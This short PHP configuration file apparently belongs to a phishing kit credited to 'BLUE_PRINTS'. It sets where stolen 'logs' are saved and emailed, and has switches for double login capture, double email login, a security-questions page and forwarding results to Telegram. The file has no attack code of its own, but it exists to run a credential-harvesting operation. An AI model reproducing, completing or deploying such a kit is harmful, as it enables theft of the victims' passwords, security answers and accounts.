<?php

// ------------------------------------------------- //
  #                  @blue_prints                 #
  #              Develop by BLUE_PRINTS            #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//


//important details
$emailzz = ""; // youir email
$salt = "87gd12"; // File name TO SECURE LOGS ON CPANNEL
// GOTO STEP>DATA FOLDER FOR TXT FILES

//important on/off

$d_log = "on"; // double login
$e_log = "on"; // double email login
$ques = "on"; // to turn on/off ques page
$emailpage = "on"; // To turn on/off email page
$savetxt = "on"; // to save txt file of log

$tgresult = "on" ; // to recieve result on tg

// for zsec goto Zsec-config.php in public_html
?>